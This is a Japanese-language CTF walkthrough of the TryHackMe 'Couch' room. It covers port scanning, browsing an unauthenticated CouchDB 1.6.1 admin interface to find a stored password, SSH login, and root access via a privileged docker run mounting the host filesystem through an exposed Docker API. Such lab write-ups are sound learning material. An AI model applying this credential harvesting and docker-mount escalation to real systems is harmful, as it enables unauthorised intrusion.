# Couch

## このROOMの教訓/ポイント
- リファレンスを読むことが大事
    - 今回はExploitコードなしでrootまでいける
    - ツールに頼りすぎるとハマってしまう

## 攻撃シナリオ
1. ポートスキャン
1. リファレンスでサービスの情報収集
1. サービス内巡回＋クレデンシャル取得
1. クレデンシャルでSSH接続
1. 情報収集+権限昇格？


## ポートスキャン
```
└─# nmap -sV -sC -T4 -p- thm_target   
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## リファレンスでサービスの情報収集
- リファレンスを確認
    https://docs.couchdb.org/en/1.6.1/intro/tour.html

- データベース一覧見れる的な記述
```
we can get a list of databases:

curl -X GET http://127.0.0.1:5984/_all_dbs
```
- ブラウザ管理画面が見える的な記述
```
After having seen CouchDB’s raw API, let’s get our feet wet by playing with Futon, the built-in administration interface. Futon provides full access to all of CouchDB’s features and makes it easy to work with some of the more complex ideas involved. With Futon we can create and destroy databases; view and edit documents; compose and run MapReduce views; and trigger replication between databases.

To load Futon in your browser, visit:

http://127.0.0.1:5984/_utils/
```

## サービス内巡回＋クレデンシャル取得
- 実際にブラウザでアクセスしてみる
    - http://thm_target:5984/_utils
    - 探索していると如何にもなクレデンシャルがある
        - http://thm_target:5984/_utils/document.html?secret/a1320dd69fb4570d0a3d26df4e000be7

        - Fieldに[passwordbackup]という如何にもなクレデンシャルがある


## クレデンシャルでSSH接続

```
└─# ssh atena@thm_target
atena@thm_target's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Wed Aug  4 04:22:06 2021 from 10.17.16.164

```

## 情報収集+権限昇格？

- sudo -lやるも使えない
```
atena@ubuntu:~$ sudo -l
[sudo] password for atena: 
Sorry, user atena may not run sudo on ubuntu.
```
- ディレクトリ配下見てみると「.bash_history」がある
```
atena@ubuntu:~$ ls -al
total 48
drwxr-xr-x 6 atena atena 4096 Dec 18  2020 .
drwxr-xr-x 3 root  root  4096 Oct 24  2020 ..
-rw------- 1 atena atena 3171 Dec 18  2020 .bash_history
-rw-r--r-- 1 atena atena  220 Oct 24  2020 .bash_logout
-rw-r--r-- 1 atena atena 3771 Oct 24  2020 .bashrc
drwxr-xr-x 3 root  root  4096 Oct 24  2020 .bundle
drwx------ 2 atena atena 4096 Oct 24  2020 .cache
drwx------ 2 root  root  4096 Oct 24  2020 .gnupg
drwxrwxr-x 2 atena atena 4096 Dec 18  2020 .nano
-rw-r--r-- 1 atena atena  655 Oct 24  2020 .profile
-rw-r--r-- 1 atena atena    0 Oct 24  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 atena atena   22 Dec 18  2020 user.txt
-rw-r--r-- 1 root  root   183 Oct 24  2020 .wget-hsts
```

- 「.bash_history」見てみるといかがわかる
    - /root配下にroot.txtを作っている
    - /直下をdockerの/mntで見れるようにしている

```
atena@ubuntu:~$ cat .bash_history 
略
cd /root
ls
cd flag/
ls
cd ..
rm -r flag/
apt-get remove redis
nano root.txt
exit
sudo deluser USERNAME sudo
sudo deluser atena sudo
exit
sudo -s
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
uname -a
exit
```

- やってみる
```
atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
/ # whoami
root
/ # ls /mnt/root
root.txt

```
